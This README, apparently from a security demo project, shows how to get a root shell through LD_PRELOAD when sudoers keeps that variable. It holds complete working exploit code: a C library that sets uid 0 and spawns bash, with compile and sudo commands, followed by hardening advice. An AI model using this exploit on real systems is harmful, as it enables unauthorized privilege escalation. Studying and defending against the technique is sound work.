# 📌 Gaining Root Shell via LD_PRELOAD

This project demonstrates how to gain a root shell using the `LD_PRELOAD` environment variable by exploiting specific `sudo` privileges assigned to a user.

## 📚 Description

If the `sudo` configuration allows keeping the `LD_PRELOAD` environment variable (e.g., `env_keep+=LD_PRELOAD`) and the user is allowed to run specific programs as `root` with `NOPASSWD`, it is possible to escalate privileges and spawn a root shell using a custom `.so` library.

Example `sudo -l` output:

```bash
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/nmap
    ...
    ...
```

## 🛠️ Installation & Usage

### 1. Write the C Library

Create a file called `library.c` and add the following code:

```bash
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### 2. Compile

Compile the file into a shared object using the following command:

```bash
gcc -fPIC -shared -o /tmp/library.so library.c -nostartfiles
```

### 3. Spawn a Root Shell

Execute a binary that you are allowed to run as root, using `LD_PRELOAD`:

```bash
sudo LD_PRELOAD=/tmp/library.so /usr/bin/nmap
```

You should now have a root shell (indicated by the `#` prompt).

## 🔒 Security Recommendations

For system administrators:

- Avoid using `env_keep+=LD_PRELOAD` in `sudoers`, as it poses a security risk.
- Use `NOPASSWD` judiciously and restrict to essential commands only.
- Always follow the principle of least privilege when assigning sudo rights.

